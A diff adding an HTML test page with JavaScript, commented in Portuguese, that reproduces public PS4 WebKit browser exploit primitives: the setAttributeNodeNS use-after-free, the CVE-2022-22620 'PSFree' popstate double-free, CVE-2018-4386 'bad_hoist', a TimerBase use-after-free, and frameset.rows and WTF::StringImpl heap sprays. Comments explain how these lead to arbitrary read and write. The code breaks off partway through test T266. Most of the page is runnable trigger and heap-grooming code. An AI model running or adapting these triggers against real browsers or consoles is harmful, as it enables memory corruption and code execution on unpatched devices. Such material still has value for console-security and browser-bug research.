@@ -1,0 +1,1459 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Testes11 — setAttributeNodeNS / PSFree / bad_hoist / TimerBase</title></head>
+<body>
+
+<p><strong>VETORES DOCUMENTADOS PS4 COM PoC PUBLICO:</strong><br>
+T251: setAttributeNodeNS UAF (SpecterDev/qwerty exato)<br>
+T252-254: CVE-2022-22620 PSFree popstate + SerializedScriptValue double-free<br>
+T255-257: CVE-2018-4386 bad_hoist ForInContext invalido<br>
+T258: TimerBase::heapPop UAF<br>
+T259-261: frameset.rows spray (IsoHeap PSFree technique)<br>
+T262-263: postMessage + ImageData (MarkedArgumentBuffer)<br>
+T264-265: WTF::StringImpl spray<br>
+T266-275: Vetores adicionais WebCore no-JIT</p>
+
+<input id="inp11" type="text" value="">
+<input id="inp12" type="text" value="anchor">
+<a id="anchor11" href="#anchor11">anchor</a>
+<div id="dom11" style="display:none"></div>
+<iframe id="frame11" src="about:blank" style="display:none"></iframe>
+
+<button onclick="runAll()">RODAR TODOS</button>
+<br><br>
+<button onclick="t251()">T251</button>
+<button onclick="t252()">T252</button>
+<button onclick="t253()">T253</button>
+<button onclick="t254()">T254</button>
+<button onclick="t255()">T255</button>
+<button onclick="t256()">T256</button>
+<button onclick="t257()">T257</button>
+<button onclick="t258()">T258</button>
+<button onclick="t259()">T259</button>
+<button onclick="t260()">T260</button>
+<button onclick="t261()">T261</button>
+<button onclick="t262()">T262</button>
+<button onclick="t263()">T263</button>
+<button onclick="t264()">T264</button>
+<button onclick="t265()">T265</button>
+<button onclick="t266()">T266</button>
+<button onclick="t267()">T267</button>
+<button onclick="t268()">T268</button>
+<button onclick="t269()">T269</button>
+<button onclick="t270()">T270</button>
+<button onclick="t271()">T271</button>
+<button onclick="t272()">T272</button>
+<button onclick="t273()">T273</button>
+<button onclick="t274()">T274</button>
+<button onclick="t275()">T275</button>
+
+<pre id="o"></pre>
+
+<script>
+function log(m){ document.getElementById('o').textContent += m + '\n'; }
+
+// GC correto PS4 LLInt — mesma funcao usada em PSFree real
+// PSFree usa: new Uint8Array(4 * MB) em loop
+const MB = 1024 * 1024;
+function gc(){
+  for(let i = 0; i < 0x10; i++) new Uint8Array(4 * MB);
+}
+function gcHeavy(){
+  for(let i = 0; i < 0x40; i++) new ArrayBuffer(0x1000000); // identico ao SpecterDev PoC
+}
+
+function runAll(){
+  log('=== RODAR TODOS: inicio ===');
+  t251(); t252(); t253(); t254(); t255();
+  t256(); t257(); t258(); t259(); t260();
+  t261(); t262(); t263(); t264(); t265();
+  t266(); t267(); t268(); t269(); t270();
+  t271(); t272(); t273(); t274(); t275();
+  log('=== RODAR TODOS: fim ===');
+}
+
+// T251 — setAttributeNodeNS UAF EXATO (SpecterDev/qwertyoruiopz PS4 <= 5.02)
+// PoC publicado em exploit-db 44230 e Cryptogenic/Exploit-Writeups.
+// setAttributeInternal() chama setAttributeNodeNS() duas vezes para o mesmo atributo:
+// a segunda adiciona o Attr ao novo owner, mas o primeiro owner (iframe) ainda tem a ref.
+// Quando o iframe e removido e o GC coleta, o Attr ainda tem stale ownerElement.
+// Deteccao: d.attributes[0].ownerElement deve ser null; se for o iframe — UAF confirmado.
+function t251(){
+  log('Teste 251: inicio');
+  try {
+    // Callback que executa quando o iframe tenta carregar o src javascript:
+    window._t251cb = function(){
+      window._t251cb = null;
+      try {
+        d251.setAttributeNodeNS(src251);
+        f251.setAttributeNodeNS(document.createAttribute('src'));
+      } catch(e){}
+    };
+
+    let src251 = document.createAttribute('src');
+    src251.value = 'javascript:parent._t251cb && parent._t251cb()';
+    let d251 = document.createElement('div');
+    let f251 = document.body.appendChild(document.createElement('iframe'));
+
+    f251.setAttributeNodeNS(src251); // [1] src251.ownerElement = f251
+    f251.remove();                    // [2] remover iframe do DOM
+    f251 = null;                      // [3] soltar referencia JS
+    src251 = null;                    // [4] soltar referencia ao Attr
+    gcHeavy();                        // [5] GC: iframe coletado; Attr tem stale ptr
+
+    // Verificar: ownerElement deve ser null (iframe foi coletado)
+    // Se ainda retornar o iframe — a memoria foi acessada via ponteiro stale
+    try {
+      let owner = d251.attributes[0] ? d251.attributes[0].ownerElement : null;
+      if(owner !== undefined && owner !== null){
+        // UAF confirmado: acessar campos do owner (iframe objeto coletado)
+        try { owner.src; }          catch(e){}
+        try { owner.contentWindow; } catch(e){}
+        try { owner.remove(); }     catch(e){}
+      }
+    } catch(e){}
+  } catch(e){}
+  log('Teste 251: fim');
+}
+
+// T252 — CVE-2022-22620 / PSFree EXATO: popstate + event.state UAF
+// PoC documentado na psdevwiki (Maddie Stone / Sergei Glazunov):
+// 1) pushState com URL hash -> cria HistoryItem com SerializedScriptValue (SSV)
+// 2) pushState sem hash -> novo HistoryItem
+// 3) input.focus() + input.onblur = () => history.replaceState('state3', '')
+// 4) history.back() -> loadInSameDocument() recebe stateObject sem incrementar refcount
+// 5) onblur dispara history.replaceState -> HistoryItem original libera o SSV
+// 6) popstate handler acessa event.state -> acesso ao SSV liberado = UAF
+function t252(){
+  log('Teste 252: inicio');
+  try {
+    const input252 = document.getElementById('inp11');
+    if(!input252) throw new Error('inp11 nao encontrado');
+
+    let poppedState = null;
+
+    function popHandler(event){
+      removeEventListener('popstate', popHandler);
+      try {
+        // event.state acessa o SerializedScriptValue que pode estar liberado
+        poppedState = event.state; // UAF: SSV foi liberado pelo replaceState no onblur
+        if(poppedState !== null && typeof poppedState === 'object'){
+          // Tentar acessar campos do SSV liberado
+          try { JSON.stringify(poppedState); }         catch(e){}
+          try { Object.keys(poppedState); }            catch(e){}
+          try { poppedState.toString(); }              catch(e){}
+        }
+      } catch(e){}
+    }
+
+    addEventListener('popstate', popHandler);
+
+    // [1] pushState com URL que contem hash (state1)
+    try {
+      history.pushState(
+        { id: 'state1', data: new Array(100).fill(42), buf: new ArrayBuffer(256) },
+        '',
+        location.pathname + '#psfree_t252'
+      );
+    } catch(e){}
+
+    // [2] pushState sem hash (state2) — criando segundo HistoryItem
+    try {
+      history.pushState(
+        { id: 'state2', data: new Array(100).fill(99) },
+        '',
+        location.pathname
+      );
+    } catch(e){}
+
+    // [3+4+5] input.focus -> onblur = replaceState -> history.back() (com delay)
+    setTimeout(function(){
+      try {
+        input252.focus();
+        input252.onblur = function(){
+          // Este replaceState libera o SSV do state1 (HistoryItem atual)
+          try { history.replaceState({ id: 'state3', replace: true }, '', location.pathname); } catch(e){}
+        };
+        setTimeout(function(){
+          // history.back() vai para state1; loadInSameDocument pega SSV sem addRef
+          // onblur dispara no caminho, liberando o SSV via replaceState
+          try { history.back(); } catch(e){}
+        }, 500);
+      } catch(e){}
+    }, 500);
+  } catch(e){}
+  log('Teste 252: fim');
+}
+
+// T253 — CVE-2022-22620 variante: popstate com SerializedScriptValue grande + spray
+// Variante que usa um SSV maior para aumentar a janela de colisao no heap.
+// PSFree usa frameset.rows para spray do fastMalloc apos a liberacao do SSV.
+function t253(){
+  log('Teste 253: inicio');
+  try {
+    // Criar SSV grande para ocupar espaco significativo no fastMalloc heap
+    // PSFree usa: rows = ','.repeat(ssv_len / 8 - 2)
+    // ssv_len tipico no PS4 FW 13 ~ 0x58 bytes
+    const ssv_len = 0x58;
+    const rows = ','.repeat(ssv_len / 8 - 2); // 9 virgulas = 10 linhas
+
+    let popHandled = false;
+    function popHandler253(evt){
+      if(popHandled) return;
+      popHandled = true;
+      removeEventListener('popstate', popHandler253);
+      try {
+        // Acessar state: pode ser o SSV liberado
+        let s = evt.state;
+        // Spray com frameset (tecnica PSFree) para reclamar o espaco do SSV liberado
+        const fsets = [];
+        for(let i = 0; i < 100; i++){
+          const fset = document.createElement('frameset');
+          fset.rows = rows;
+          fset.cols = rows;
+          fsets.push(fset);
+        }
+        gc();
+        // Acessar state apos spray — se heap foi reclamado, state aponta para frameset
+        try { let s2 = evt.state; }  catch(e){}
+        try { if(s) s.toString(); }  catch(e){}
+      } catch(e){}
+    }
+    addEventListener('popstate', popHandler253);
+
+    try {
+      history.pushState({ big: new Array(200).fill('x'), ts: Date.now() }, '', location.pathname + '#t253a');
+      history.pushState({ replace_target: true }, '', location.pathname + '#t253b');
+    } catch(e){}
+
+    const inp253 = document.getElementById('inp11');
+    setTimeout(function(){
+      try {
+        if(inp253) inp253.focus();
+        if(inp253) inp253.onblur = function(){
+          try { history.replaceState({ freed: true }, '', location.pathname); } catch(e){}
+        };
+        setTimeout(function(){
+          try { history.back(); } catch(e){}
+        }, 500);
+      } catch(e){}
+    }, 600);
+  } catch(e){}
+  log('Teste 253: fim');
+}
+
+// T254 — CVE-2022-22620 + WTF::StringImpl spray (tecnica PSFree stage 2)
+// Apos o SSV ser liberado, PSFree spraya WTF::StringImpl para reclamar o espaco.
+// O StringImpl contem m_data (ponteiro) e strlen — modificar esses campos via
+// o SSV liberado permite leitura/escrita arbitraria.
+function t254(){
+  log('Teste 254: inicio');
+  try {
+    // Spray de StringImpl com tamanho igual ao SSV (~0x58 bytes)
+    // StringImpl de string com comprimento original = ssv_len - sizeof(StringImpl_header)
+    // No PS4 FW 13: sizeof(StringImpl) ~ 0x20, logo string de comprimento ~0x38 = 56 chars
+    const targetLen = 56;
+    const strings = [];
+    for(let i = 0; i < 500; i++){
+      // Criar string de comprimento exato para que o StringImpl tenha ~0x58 bytes total
+      strings.push(String.fromCharCode(65 + (i % 26)).repeat(targetLen) + i.toString().padStart(4, '0'));
+    }
+
+    let poppedSV = null;
+    function popHandler254(evt){
+      removeEventListener('popstate', popHandler254);
+      try {
+        poppedSV = evt.state;
+        // Soltar strings -> GC -> StringImpl liberados -> fastMalloc pode reclamar espaco do SSV
+        strings.length = 0;
+        gcHeavy();
+        // Re-criar strings para reclamar espaco (onde SSV estava antes)
+        for(let i = 0; i < 500; i++){
+          strings.push(String.fromCharCode(65 + (i % 26)).repeat(targetLen) + i.toString().padStart(4, '0'));
+        }
+        // Acessar state apos spray — se StringImpl ocupou slot do SSV, leitura de state
+        // vai interpretar os bytes do StringImpl como campos do SSV
+        try {
+          if(poppedSV !== null){
+            let r = poppedSV;
+            r.toString();
+          }
+        } catch(e){}
+      } catch(e){}
+    }
+    addEventListener('popstate', popHandler254);
+
+    try {
+      history.pushState({ marker: 'T254', arr: new Array(50).fill(0xDEAD) }, '', location.pathname + '#t254a');
+      history.pushState({ step2: true }, '', location.pathname + '#t254b');
+    } catch(e){}
+
+    const inp254 = document.getElementById('inp11');
+    setTimeout(function(){
+      try {
+        if(inp254){ inp254.focus(); }
+        if(inp254){ inp254.onblur = function(){ try { history.replaceState({ freed: 'T254' }, '', location.pathname); } catch(e){} }; }
+        setTimeout(function(){ try { history.back(); } catch(e){} }, 400);
+      } catch(e){}
+    }, 600);
+  } catch(e){}
+  log('Teste 254: fim');
+}
+
+// T255 — CVE-2018-4386 bad_hoist EXATO: ForInContext invalido (lokihardt/Fire30)
+// BytecodeGenerator::hoistSloppyModeFunctionIfNecessary nao invalida o ForInContext.
+// PoC: declarar funcao em modo sloppy dentro de um for-in faz hoisting da funcao,
+// mas o ForInContext (que rastreia a variavel de iteracao) nao e invalidado.
+// Resultado: ler a variavel de iteracao apos o hoist da funcao retorna valor stale/UAF.
+function t255(){
+  log('Teste 255: inicio');
+  try {
+    // Variante 1: for-in com function declaration interna (sloppy mode hoisting)
+    var t255result = null;
+    try {
+      var obj255 = { a: 1, b: 2, c: 3, d: 4, e: 5 };
+      for(var key255 in obj255){
+        // Declarar funcao aqui causa hoisting — ForInContext nao e invalidado
+        function hoisted255(){ return key255; } // eslint-disable-line no-inner-declarations
+        t255result = hoisted255(); // key255 pode ser stale (UAF do ForInContext)
+        break;
+      }
+    } catch(e){}
+
+    // Variante 2: for-in + function declaration + GC
+    try {
+      var bigObj255 = {};
+      for(let i = 0; i < 100; i++) bigObj255['p' + i] = i;
+      for(var k255 in bigObj255){
+        function hoistedGC255(){ gc(); return k255; } // eslint-disable-line no-inner-declarations
+        let r = hoistedGC255();
+        if(r !== k255){ break; } // divergencia indica ForInContext stale
+      }
+    } catch(e){}
+
+    // Variante 3: for-in aninhado com function declaration no interno
+    try {
+      var outer255 = { x: 1, y: 2 };
+      var inner255 = { a: 10, b: 20, c: 30 };
+      for(var ko in outer255){
+        for(var ki in inner255){
+          function nestedHoist(){ return ko + ':' + ki; } // eslint-disable-line no-inner-declarations
+          let r = nestedHoist();
+          gc();
+        }
+      }
+    } catch(e){}
+
+    // Variante 4: for-in com delete durante iteracao + function hoist
+    try {
+      var delObj = { p0:0, p1:1, p2:2, p3:3, p4:4 };
+      for(var kd in delObj){
+        function deleteHoist(){ delete delObj['p2']; gc(); return kd; } // eslint-disable-line no-inner-declarations
+        deleteHoist();
+      }
+    } catch(e){}
+  } catch(e){}
+  log('Teste 255: fim');
+}
+
+// T256 — bad_hoist variante: for-in + __proto__ change + function hoist + GC
+// Combinar o ForInContext invalido (bad_hoist) com a mutacao de __proto__
+// (JSPropertyNameEnumerator UAF) para pressao maxima no enumerador LLInt.
+function t256(){
+  log('Teste 256: inicio');
+  try {
+    var obj256 = { a: 1, b: 2, c: 3, d: 4 };
+    for(var k256 in obj256){
+      function changeProto256(){ // eslint-disable-line no-inner-declarations
+        obj256.__proto__ = { injected: true }; // mudar proto invalida StructureID
+        gc(); // GC: ForInContext stale + StructureID stale = dupla pressao
+        return k256;
+      }
+      try { changeProto256(); } catch(e){}
+    }
+
+    // Versao com objeto que tem getter no proto
+    var baseProto = {};
+    Object.defineProperty(baseProto, 'getterProp', {
+      get: function(){ gc(); return 'getter_value'; },
+      enumerable: true
+    });
+    var obj256b = Object.create(baseProto);
+    obj256b.own1 = 1; obj256b.own2 = 2; obj256b.own3 = 3;
+
+    for(var k256b in obj256b){
+      function protoGetter256(){ // eslint-disable-line no-inner-declarations
+        try { return obj256b[k256b]; } catch(e){ return null; }
+      }
+      try { protoGetter256(); } catch(e){}
+      gc();
+    }
+
+    // with + for-in + function hoist (combinacao extrema)
+    try {
+      var withScope = { wx: 10, wy: 20, wz: 30 };
+      with(withScope){ // eslint-disable-line no-with
+        for(var kwith in withScope){
+          function withHoist(){ // eslint-disable-line no-inner-declarations
+            gc();
+            return typeof wx !== 'undefined' ? wx : kwith;
+          }
+          try { withHoist(); } catch(e){}
+        }
+      }
+    } catch(e){}
+  } catch(e){}
+  log('Teste 256: fim');
+}
+
+// T257 — bad_hoist com eval + for-in (BytecodeGenerator stress)
+// eval dentro de for-in recompila o bytecode; se o ForInContext nao foi
+// invalidado antes do eval, o contexto fica corrompido.
+function t257(){
+  log('Teste 257: inicio');
+  try {
+    var evalObj = {};
+    for(let i = 0; i < 20; i++) evalObj['ep' + i] = i * 10;
+
+    var capturedKey = null;
+    for(var kevl in evalObj){
+      capturedKey = kevl;
+      // eval re-entra no bytecode generator — ForInContext pode ser invalido
+      try {
+        eval('function evalHoist(){ return kevl; }'); // eslint-disable-line no-eval
+        let r = eval('evalHoist()');                  // eslint-disable-line no-eval
+        gc();
+        // Se r !== kevl, o ForInContext esta stale
+      } catch(e){}
+    }
+
+    // Variante: for-of + function declaration (similar ao for-in mas com iterador)
+    try {
+      var arr257 = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
+      for(var v257 of arr257){
+        function forOfHoist(){ return v257; } // eslint-disable-line no-inner-declarations
+        let r = forOfHoist();
+        if(r !== v257){ break; }
+        gc();
+      }
+    } catch(e){}
+
+    // try-catch + for-in + function hoist (ExceptionContext + ForInContext)
+    try {
+      var tryCatchObj = { tc1: 1, tc2: 2, tc3: 3 };
+      for(var ktc in tryCatchObj){
+        function tcHoist(){ // eslint-disable-line no-inner-declarations
+          try {
+            gc();
+            throw new Error('test_' + ktc);
+          } catch(err){
+            return ktc + '_caught';
+          }
+        }
+        try { tcHoist(); } catch(e){}
+      }
+    } catch(e){}
+  } catch(e){}
+  log('Teste 257: fim');
+}
+
+// T258 — TimerBase::heapPop UAF (PS4 WebCore timer system)
+// WebCore::TimerBase usa um heap de timers; quando um timer e destruido durante
+// seu proprio callback (via removeEventListener ou elemento removido), o heapPop
+// acessa o 'this' liberado -> SEGV em TimerBase::heapPop.
+// Documentado na psdevwiki como crash em acesso a 'this' pointer liberado.
+function t258(){
+  log('Teste 258: inicio');
+  try {
+    const area = document.getElementById('dom11');
+    if(!area) throw new Error('sem dom11');
+    area.style.display = 'block';
+
+    // Criar elementos com timers CSS (animation/transition) que serao removidos
+    // durante a execucao do callback do timer
+    const timerEls = [];
+    for(let i = 0; i < 20; i++){
+      const el = document.createElement('div');
+      el.style.cssText = [
+        'width:50px', 'height:50px',
+        'background:red',
+        'animation:t258anim 0.05s linear ' + i + 'ms 1 forwards',
+      ].join(';');
+      area.appendChild(el);
+      timerEls.push(el);
+    }
+
+    // Keyframe que dispara animationend
+    const sty = document.createElement('style');
+    sty.textContent = '@keyframes t258anim { from{opacity:1} to{opacity:0} }';
+    document.head.appendChild(sty);
+
+    // Handler de animationend: remover o proprio elemento durante o callback
+    // Isso destroi o timer animacao enquanto WebCore::TimerBase::heapPop esta ativo
+    function animEndSelfDestruct(evt){
+      const el = evt.target;
+      el.removeEventListener('animationend', animEndSelfDestruct);
+      try {
+        if(el.parentNode) el.parentNode.removeChild(el);
+        gc(); // GC durante destruicao do timer: TimerBase::this pode ser stale
+        // Tentar re-criar a animacao no mesmo espaco de memoria
+        const newEl = document.createElement('div');
+        newEl.style.cssText = el.style.cssText; // mesmo estilo, mesmo tamanho
+        area.appendChild(newEl);
+        gcHeavy();
+        area.removeChild(newEl);
+      } catch(e){}
+    }
+
+    for(let el of timerEls) el.addEventListener('animationend', animEndSelfDestruct);
+
+    // Forcar layout para iniciar as animacoes
+    let _ = area.offsetHeight;
+
+    // setTimeout para cleanup caso animacoes nao disparem
+    setTimeout(function(){
+      try { document.head.removeChild(sty); } catch(e){}
+      while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+      area.style.display = 'none';
+    }, 2000);
+  } catch(e){}
+  log('Teste 258: fim');
+}
+
+// T259 — frameset.rows/cols spray EXATO (tecnica PSFree IsoHeap)
+// PSFree usa: fset.rows = ','.repeat(ssv_len/8-2) para spraying do fastMalloc.
+// O frameset aloca um vetor de strings para as linhas/colunas, que vai para
+// o mesmo bucket do fastMalloc que o SerializedScriptValue.
+// Aqui testamos se o frameset.rows causa corrompimento de heap vizinho.
+function t259(){
+  log('Teste 259: inicio');
+  try {
+    // Tamanhos de SSV conhecidos para varios firmwares PS4:
+    // FW 6.xx: 0x58, FW 7.xx-8.xx: 0x60, FW 9.xx-10.xx: 0x68
+    // FW 11.xx-13.xx: possivelmente 0x70 ou maior
+    const ssv_sizes = [0x58, 0x60, 0x68, 0x70, 0x78, 0x80];
+
+    for(let ssv_len of ssv_sizes){
+      try {
+        const rows = ','.repeat(Math.max(1, ssv_len / 8 - 2));
+        const fsets = [];
+        // Spray: 200 framesets com rows/cols correspondentes ao tamanho do SSV
+        for(let i = 0; i < 200; i++){
+          const fset = document.createElement('frameset');
+          fset.rows = rows;
+          fset.cols = rows;
+          fsets.push(fset);
+        }
+        gc();
+        // Liberar metade — criar buracos no bucket
+        for(let i = 0; i < 100; i++) fsets[i].rows = '';
+        gc();
+        // Reutilizar espaco com novos framesets de tamanho ligeiramente diferente
+        for(let i = 100; i < 200; i++){
+          fsets[i].rows = ','.repeat(Math.max(1, ssv_len / 8 - 1));
+        }
+        gc();
+      } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 259: fim');
+}
+
+// T260 — frameset spray + history UAF (PSFree combinado EXATO)
+// Combinar o spray de frameset (T259) com o popstate UAF (T252-254)
+// na sequencia exata usada pelo PSFree para obter leitura arbitraria.
+function t260(){
+  log('Teste 260: inicio');
+  try {
+    const ssv_len = 0x68; // tamanho tipico PS4 FW 10-13
+    const rows = ','.repeat(ssv_len / 8 - 2);
+
+    // Pre-spray para aquecer o bucket do fastMalloc
+    const preSpray = [];
+    for(let i = 0; i < 50; i++){
+      const fset = document.createElement('frameset');
+      fset.rows = rows;
+      preSpray.push(fset);
+    }
+    gc();
+    // Liberar pre-spray para criar buracos que o SSV vai ocupar
+    preSpray.length = 0;
+    gc();
+
+    // Agora pushState: SSV vai para um dos buracos deixados pelo pre-spray
+    let ssv = null;
+    function popHandler260(evt){
+      removeEventListener('popstate', popHandler260);
+      ssv = evt.state;
+      // Spray apos SSV liberado: frameset vai reclamar o espaco do SSV
+      const postSpray = [];
+      for(let i = 0; i < 200; i++){
+        const fset = document.createElement('frameset');
+        fset.rows = rows;
+        fset.cols = rows;
+        postSpray.push(fset);
+      }
+      // Tentar ler o state (que agora pode ser um frameset no heap)
+      try {
+        if(ssv !== null && typeof ssv === 'object'){
+          let v = ssv.marker;
+          let k = Object.keys(ssv);
+        }
+      } catch(e){}
+      gcHeavy();
+    }
+    addEventListener('popstate', popHandler260);
+
+    try {
+      history.pushState({ marker: 0xDEADBEEF, data: new Array(ssv_len/8 - 4).fill(0xCAFE) }, '', location.pathname + '#t260a');
+      history.pushState({ step2: true }, '', location.pathname + '#t260b');
+    } catch(e){}
+
+    const inp = document.getElementById('inp11');
+    setTimeout(function(){
+      try {
+        if(inp){ inp.focus(); }
+        if(inp){ inp.onblur = function(){ try { history.replaceState(null, '', location.pathname); } catch(e){}; }; }
+        setTimeout(function(){ try { history.back(); } catch(e){}; }, 300);
+      } catch(e){}
+    }, 300);
+  } catch(e){}
+  log('Teste 260: fim');
+}
+
+// T261 — frameset multidimensional + GC (stress no fastMalloc bucket)
+// Usar rows E cols grandes simultaneamente dobra a pressao no fastMalloc.
+// Tambem testar framesets com rows/cols de tamanhos que cruzam limites de smallpage.
+function t261(){
+  log('Teste 261: inicio');
+  try {
+    // Tamanhos que cruzam limites de smallline (256 bytes) e smallpage (4KB)
+    const rowCounts = [1, 7, 15, 31, 63, 127, 255, 511, 1023];
+    for(let n of rowCounts){
+      try {
+        const fset = document.createElement('frameset');
+        const rowStr = new Array(n).fill('1fr').join(',');
+        fset.rows = rowStr;
+        fset.cols = rowStr; // dobrar: rows * cols = n^2 alocacoes
+        gc();
+        fset.rows = ''; // liberar — pode causar heap fragmentation
+        gc();
+      } catch(e){}
+    }
+
+    // Spray massivo de frameset com rows identicos (maxima sobreposicao no bucket)
+    const fsets261 = [];
+    for(let i = 0; i < 300; i++){
+      try {
+        const fset = document.createElement('frameset');
+        fset.rows = ','.repeat(10);
+        fsets261.push(fset);
+      } catch(e){}
+    }
+    gc();
+    // Liberar em ordem reversa para criar padrao especifico de buracos
+    while(fsets261.length > 0){
+      try {
+        const fset = fsets261.pop();
+        fset.rows = '';
+      } catch(e){}
+      if(fsets261.length % 50 === 0) gc();
+    }
+    gcHeavy();
+  } catch(e){}
+  log('Teste 261: fim');
+}
+
+// T262 — postMessage + ImageData (MarkedArgumentBuffer leak — SpecterDev stage 1)
+// ImageData e fastmalloc()'d e contem ponteiros para o GC heap (JSCore).
+// postMessage(imageData) cria uma copia serializada via MarkedArgumentBuffer.
+// Se o ImageData e liberado durante a serializacao, o MarkedArgumentBuffer tem UAF.
+function t262(){
+  log('Teste 262: inicio');
+  try {
+    // Criar ImageData de varios tamanhos
+    const canvas = document.createElement('canvas');
+    canvas.width = 256;
+    canvas.height = 256;
+    const ctx = canvas.getContext('2d');
+
+    // Preencher com dados conhecidos para detectar corrompimento
+    ctx.fillStyle = 'rgb(0xDE, 0xAD, 0xBE)';
+    ctx.fillRect(0, 0, 256, 256);
+
+    let imgData = ctx.getImageData(0, 0, 256, 256);
+    let imgDataRef = imgData;
+
+    // Criar MessageChannel para postMessage local
+    const mc = new MessageChannel();
+    mc.port1.onmessage = function(evt){
+      gc(); // GC no handler — MarkedArgumentBuffer pode ter dangling ptr
+      try {
+        let data = evt.data;
+        if(data && data.pixels){
+          // Acessar pixels que vieram do ImageData serializado
+          let r = data.pixels[0];
+          let g = data.pixels[1];
+        }
+      } catch(e){}
+    };
+
+    // postMessage antes de soltar imgData
+    try { mc.port2.postMessage({ pixels: imgData.data, width: imgData.width }); } catch(e){}
+
+    // Soltar imgData + GC: MarkedArgumentBuffer pode ter stale ptr
+    imgData = null;
+    gc();
+
+    // Re-enviar com ImageData recriado (pode ocupar mesmo slot no heap)
+    let imgData2 = ctx.getImageData(0, 0, 256, 256);
+    try { mc.port2.postMessage({ pixels: imgData2.data }); } catch(e){}
+    gc();
+
+    // Versao 2: postMessage com transferable ArrayBuffer (detach durante serializacao)
+    try {
+      const buf = new ArrayBuffer(1024 * 64);
+      const view = new Uint32Array(buf);
+      for(let i = 0; i < 1024 * 16; i++) view[i] = 0xCAFEBABE;
+      mc.port2.postMessage({ buf: buf }, [buf]); // buf e detachado aqui
+      // Tentar acessar buf apos detach — UAF no ArrayBuffer
+      try { view[0]; } catch(e){} // deve retornar 0 ou throw
+    } catch(e){}
+  } catch(e){}
+  log('Teste 262: fim');
+}
+
+// T263 — postMessage + ImageData + GC durante serializacao (MarkedArgumentBuffer UAF)
+// Variante com Proxy no ImageData.data que faz GC durante o acesso
+function t263(){
+  log('Teste 263: inicio');
+  try {
+    const canvas = document.createElement('canvas');
+    canvas.width = 64; canvas.height = 64;
+    const ctx = canvas.getContext('2d');
+    let imgData = ctx.getImageData(0, 0, 64, 64);
+
+    const mc = new MessageChannel();
+    mc.port1.onmessage = function(evt){
+      try { gc(); evt.data; } catch(e){}
+    };
+
+    // Proxy do Uint8ClampedArray que faz GC ao ser acessado
+    // (nao e possivel diretamente, mas podemos usar o getter do canvas)
+    const canvasProxy = new Proxy(canvas, {
+      get: function(t, k){
+        if(k === 'getContext'){ gc(); }
+        return Reflect.get(t, k);
+      }
+    });
+
+    // Spray de ImageData de tamanhos diferentes para pressao no IsoHeap
+    const images = [];
+    for(let sz of [1, 4, 16, 64, 256, 1024]){
+      try {
+        const c = document.createElement('canvas');
+        c.width = sz; c.height = sz;
+        const cx = c.getContext('2d');
+        if(cx) images.push(cx.getImageData(0, 0, sz, sz));
+      } catch(e){}
+    }
+
+    // Serializar todos via postMessage
+    for(let img of images){
+      try { mc.port2.postMessage(img); } catch(e){}
+      gc();
+    }
+
+    // Liberar todos e GC
+    images.length = 0;
+    gcHeavy();
+
+    // Tentar enviar imgData original apos GC dos outros
+    try { mc.port2.postMessage(imgData); } catch(e){}
+    imgData = null;
+    gcHeavy();
+  } catch(e){}
+  log('Teste 263: fim');
+}
+
+// T264 — WTF::StringImpl spray: strings com comprimento exato para bucket 0x58
+// PSFree spraya StringImpl apos liberar o SSV para obter leitura via m_data.
+// Aqui stressamos a alocacao/liberacao de StringImpl no mesmo bucket.
+function t264(){
+  log('Teste 264: inicio');
+  try {
+    // StringImpl(length=L) ocupa: sizeof(StringImpl_header) + L * sizeof(char)
+    // No PS4 (LP64): sizeof(StringImpl_header) = 0x20 (aprox)
+    // Para bucket 0x58: L = (0x58 - 0x20) = 0x38 = 56 chars (8-bit)
+    // Para bucket 0x60: L = (0x60 - 0x20) = 0x40 = 64 chars
+    const buckets = [
+      { size: 0x58, len: 56  },
+      { size: 0x60, len: 64  },
+      { size: 0x68, len: 72  },
+      { size: 0x70, len: 80  },
+      { size: 0x80, len: 96  },
+    ];
+
+    for(let { size, len } of buckets){
+      try {
+        const spray = [];
+        // Spray: 500 strings de comprimento exato
+        for(let i = 0; i < 500; i++){
+          spray.push(('A'.repeat(len - 4) + i.toString().padStart(4, '0')));
+        }
+        gc();
+        // Verificar que strings nao foram corrompidas
+        let corrupted = 0;
+        for(let i = 0; i < spray.length; i++){
+          if(spray[i].length !== len) corrupted++;
+        }
+        // Liberar em ordem alternada (cria fragmentacao maxima)
+        for(let i = 0; i < spray.length; i += 2) spray[i] = null;
+        gc();
+        // Realoca com strings ligeiramente diferentes (pode reclamar buracos)
+        for(let i = 0; i < spray.length; i += 2){
+          spray[i] = 'B'.repeat(len - 4) + i.toString().padStart(4, '0');
+        }
+        gc();
+        spray.length = 0;
+        gc();
+      } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 264: fim');
+}
+
+// T265 — WTF::StringImpl m_data stale via substring + GC (read primitive setup)
+// PSFree corrompe m_data do StringImpl para obter leitura arbitraria.
+// Aqui testamos o comportamento de substrings com StringImpl stale.
+function t265(){
+  log('Teste 265: inicio');
+  try {
+    // Criar strings de referencia de comprimento exato para o bucket SSV
+    const refStrs = [];
+    for(let i = 0; i < 200; i++){
+      refStrs.push(('X'.repeat(52) + i.toString().padStart(4, '0'))); // 56 chars
+    }
+
+    // Criar substrings que compartilham o StringImpl
+    const subs = refStrs.map(function(s){ return s.slice(0, 28); });
+
+    // Liberar strings originais -> StringImpl refcount pode chegar a 0
+    refStrs.length = 0;
+    gcHeavy();
+
+    // Acessar substrings cujos StringImpl podem estar liberados
+    for(let sub of subs){
+      try {
+        let l = sub.length;
+        let c = sub.charCodeAt(0);
+        let u = sub.toUpperCase();
+        let idx = sub.indexOf('X');
+        // Operacoes que leem m_data do StringImpl
+        let norm = sub.normalize('NFC');
+        let split = sub.split('');
+      } catch(e){}
+    }
+
+    // Reclamar espaco com frameset spray (bucket identico)
+    const fsets = [];
+    const rows = ','.repeat(8); // 9 linhas -> ~56 chars de dados
+    for(let i = 0; i < 200; i++){
+      const fset = document.createElement('frameset');
+      fset.rows = rows;
+      fsets.push(fset);
+    }
+
+    // Acessar substrings apos o spray — m_data pode ser corrompido pelo frameset
+    for(let sub of subs){
+      try { sub.charCodeAt(0); } catch(e){}
+      try { sub.length; }        catch(e){}
+    }
+
+    gcHeavy();
+  } catch(e){}
+  log('Teste 265: fim');
+}
+
+// T266 — HTMLTableElement: insertRow/deleteRow UAF (WebCore IsoHeap)
+// insertRow/deleteRow manipulam HTMLTableRowElement na IsoHeap;
+// deletar uma row durante um evento que referencia a row pode causar UAF.
+function t266(){
+  log('Teste 266: inicio');
+  try {
